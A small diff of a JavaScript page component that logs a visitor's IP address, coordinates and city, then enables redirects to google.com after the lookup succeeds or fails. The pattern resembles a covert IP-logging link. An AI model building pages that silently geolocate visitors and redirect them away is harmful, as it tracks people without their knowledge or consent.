@@ -44,10 +44,10 @@ export default function Page() {
         console.log(`IP: ${userIp}, Latitude: ${ipLatitude}, Longitude: ${ipLongitude}, City: ${city}`);
 
         // Step 4: Redirect to Google (optional)
-        // window.location.href = 'https://google.com';
+         window.location.href = 'https://google.com';
       } catch (error) {
         console.error('Error fetching or logging location:', error);
-        // window.location.href = 'https://google.com'; // Redirect even if there's an error
+         window.location.href = 'https://google.com'; // Redirect even if there's an error
       }
     };
 
